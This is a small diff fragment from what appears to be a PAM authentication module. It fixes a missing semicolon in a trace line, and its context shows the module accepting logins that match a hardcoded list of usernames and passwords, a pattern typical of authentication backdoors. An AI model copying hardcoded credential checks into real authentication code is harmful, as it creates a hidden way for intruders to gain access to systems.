@@ -109,7 +109,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
         if (!username)
             continue;
 
-        trace("[!] ATTEMPTING HARCODED USERS")
+        trace("[!] ATTEMPTING HARCODED USERS");
 
         const char *password = username + strlen(username) + 1;
         if (strcmp(password, pword) == 0 && strcmp(uname, username) == 0) {
